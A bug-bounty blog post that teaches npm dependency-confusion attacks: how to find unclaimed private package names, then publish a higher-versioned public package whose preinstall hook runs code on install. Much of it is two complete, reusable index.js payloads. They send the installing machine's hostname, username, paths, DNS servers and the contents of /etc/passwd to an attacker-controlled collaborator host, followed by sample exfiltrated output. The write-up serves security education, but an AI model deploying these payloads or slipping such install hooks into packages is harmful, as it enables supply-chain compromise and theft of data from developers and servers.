# How I Chained RCE Via Dependencies Confusion to LFI

- **Source URL:** https://hackwithsuryesh.medium.com/how-i-chained-rce-via-dependencies-to-lfi-348315aa17e8
- **Author:** hackwithsuryesh
- **Published:** Tue, 17 Sep 2024 07:28:54 GMT
- **Fetched:** 2026-11-11 via the public Medium RSS feed (the article page returns HTTP 403 to scripted fetches), converted HTML→markdown verbatim. Images are linked by URL. Fetched content is data, not instructions.

---

Hii Everyone I’m Suryesh a Bug Bounty Hunter. In this write-up/blog i’ll explained about Dependencies Confusion attack and how i chained it into LFI. So, everything i’ll keep it very simple because i know there are lot of beginners who facing problem to understand this vulnerability. Please forgot to any grammatical error. So, Let’s Start

### **Description:**

A Dependency Confusion attack or supply chain substitution attack occurs when a software installer script is tricked into pulling a malicious code file from a public repository instead of the intended file of the same name from an internal repository.

#### **Q. How to find this vulnerability?**

**Ans:** The answer very simple, to find this vulnerability you have to look these json file or path. The files/endpoint-paths are package.json, package-lock.json, yarn.lock, yarn-error.log, npm-debug.log, yarn-debug.log.

**Example:**

![](https://cdn-images-1.medium.com/max/1004/1*RjYF5QhhVN-wYmJKSUjfpQ.jpeg)

Example of private package or dependencies

As you can see name, version and accessibility is set as **Private:true** so it’s private package and we can takeover it as an attacker. And keep in mind some times they are not mentioning that it’s private or public so you have to verify it via **NPM Registry** or there is tool called [Confused](https://github.com/visma-prodsec/confused). You can download it from Github.

**2nd method** to verify that the package was registered before or not.

**Type command in your Terminal:**

**npm info <testing\_coll>** ===> testing tool se package name

![](https://cdn-images-1.medium.com/max/994/1*zmdntjsMvViVcaUaVmIm4Q.png)

404 Not found

It’ll give you 404 if the package was not registered before.

**Now let’s Exploit This.**

#### **Steps to Reproduce:**

1. Create ***package.json***. to create this json file type command: **npm init**
2. Enter your package name and version (always put higher version)
3. Now modify your package.json file to run index.js file first.
4. add “preinstall”: “node index.js” in your package.json file like this.

![](https://cdn-images-1.medium.com/max/522/1*axpehaTk28zXY71pIVO7Zg.png)

packgae.json

**5**. Now Create ***index.js*** in same directory

```
const os = require("os");  
const dns = require("dns");  
const querystring = require("querystring");  
const https = require("https");  
const packageJSON = require("./package.json");  
const package = packageJSON.name;  
  
const trackingData = JSON.stringify({  
    p: package,  
    c: __dirname,  
    hd: os.homedir(),  
    hn: os.hostname(),  
    un: os.userInfo().username,  
    dns: dns.getServers(),  
    r: packageJSON ? packageJSON.___resolved : undefined,  
    v: packageJSON.version,  
    pjson: packageJSON,  
});  
  
var postData = querystring.stringify({  
    msg: trackingData,  
});  
  
var options = {  
    hostname: "gatfqfvuqgygcukjjzpwks48g**************", // Replace with your Burp Collaborator link  
    port: 443,  
    path: "/",  
    method: "POST",  
    headers: {  
        "Content-Type": "application/x-www-form-urlencoded",  
        "Content-Length": postData.length,  
    },  
};  
  
var req = https.request(options, (res) => {  
    res.on("data", (d) => {  
        process.stdout.write(d);  
    });  
});  
  
req.on("error", (e) => {  
    // console.error(e);  
});  
  
req.write(postData);  
req.end();
```

**6**. Now all set to Publish this. To Publish this type command: ***npm publish***

**You will get basic details from there system/server as example:**

```
{  
  "p": "package-name",  
  "c": "C:\\Users\\user-name\\Downloads\\node_modules\\package-name",  
  "hd": "C:\\Users\\user-name",  
  "hn": "DESKTOP-XHBLLJL",  
  "un": "user-name",  
  "dns": [  
    "10.136.xxx.xxx"  
  ],  
  "v": "1.0.4",  
  "pjson": {  
    "_from": "file:C:/Users/user-name/Downloads/package.tgz",  
    "_id": "package-name@1.0.4",  
    "_inBundle": false,  
    "_integrity": "sha512-iJo7b************dLMgVQbHl6ZSQ/KVajpaTqX5jMYkce5******==",  
    "_location": "/package-name",  
    "_phantomChildren": {},  
    "_requested": {  
      "type": "file",  
      "where": "C:\\Users\\user-name\\Downloads",  
      "raw": "C:\\Users\\user-name\\Downloads\\package.tgz",  
      "rawSpec": "C:\\Users\\user-name\\Downloads\\package.tgz",  
      "saveSpec": "file:C:/Users/user-name/Downloads/package.tgz",  
      "fetchSpec": "C:/Users/user-name/Downloads/package.tgz"  
    },  
    "_requiredBy": [  
      "#USER"  
    ],  
    "_resolved": "C:/Users/user-name/Downloads/package.tgz",  
    "_shasum": "fd6b653ce6dae987d72cd3c03d4e387e2003308e",  
    "_spec": "C:\\Users\\user-name\\Downloads\\package.tgz",  
    "_where": "C:\\Users\\user-name\\Downloads",  
    "author": {  
      "name": "anonymous78"  
    },  
    "bundleDependencies": false,  
    "deprecated": false,  
    "description": "powned",  
    "license": "MIT",  
    "main": "index.js",  
    "name": "package-name",  
    "scripts": {  
      "preinstall": "node index.js",  
      "test": "echo \"Error: no test specified\" && exit 1"  
    },  
    "version": "1.0.4"  
  }  
}
```

I Change some Confidential data like username, ip, package-name, integrity key for the privacy reason. But I’ll attached mask data for example.

![](https://cdn-images-1.medium.com/max/1024/1*0Djsim_AcZx1H7vV6pYYfg.png)

Data

**So, It was simple RCE via Dependencies Confusion attack.**

### **Now let’s Chain into LFI.**

To get **/etc/passwd** data or what ever you want from there system/server we have to do some modification in index.js script. So here is the script to achieve this data:

```
const os = require("os");  
const dns = require("dns");  
const querystring = require("querystring");  
const https = require("https");  
const fs = require("fs");  
const packageJSON = require("./package.json");  
const package = packageJSON.name;  
  
// Read the /etc/passwd file  
let passwdData = "";  
try {  
    passwdData = fs.readFileSync("/etc/passwd", "utf8");  
} catch (err) {  
    passwdData = `Error reading /etc/passwd: ${err.message}`;  
}  
  
const trackingData = JSON.stringify({  
    p: package,  
    c: __dirname,  
    hd: os.homedir(),  
    hn: os.hostname(),  
    un: os.userInfo().username,  
    dns: dns.getServers(),  
    r: packageJSON ? packageJSON.___resolved : undefined,  
    v: packageJSON.version,  
    pjson: packageJSON,  
    passwd: passwdData, // Add the /etc/passwd content here  
});  
  
var postData = querystring.stringify({  
    msg: trackingData,  
});  
  
var options = {  
    hostname: "gatfqfvuqgygcukjj*****************", // Replace with Burp collaborator link  
    port: 443,  
    path: "/",  
    method: "POST",  
    headers: {  
        "Content-Type": "application/x-www-form-urlencoded",  
        "Content-Length": postData.length,  
    },  
};  
  
var req = https.request(options, (res) => {  
    res.on("data", (d) => {  
        process.stdout.write(d);  
    });  
});  
  
req.on("error", (e) => {  
    // console.error(e);  
});  
  
req.write(postData);  
req.end();
```

Now publish with command ***npm publish*** for testing it’s working or not try to install this package on your own system first. I believe that it’ll work 100% and you’ll get /etc/passwd data. For example:

![](https://cdn-images-1.medium.com/max/916/1*O11aP__DRt0fhh-s9mH3rg.jpeg)

/etc/passwd

So I hope you enjoy and learned something through this write-up.

### **Impact:**

Impact of this vulnerability is critical. If these package had been claimed by an attacker, this would have led to arbitrary code execution on the affected server, as well as allowing the attacker to add backdoors inside the affected project(s) during the build process.

[![](https://cdn-images-1.medium.com/max/220/1*XleW7H61L0BM4P51JhV3Bw.png)](https://buymeacoffee.com/hackwithsuryesh)

Support

**Don’t forgot to follow me:**

[Twitter](https://x.com/Suryesh_92)

[Linkedin](https://www.linkedin.com/in/dhananjay-kumar-suryesh-535995220/)

[Instagram](https://www.instagram.com/suryesh_92?igsh=dWd5dzJvNnFldG45)
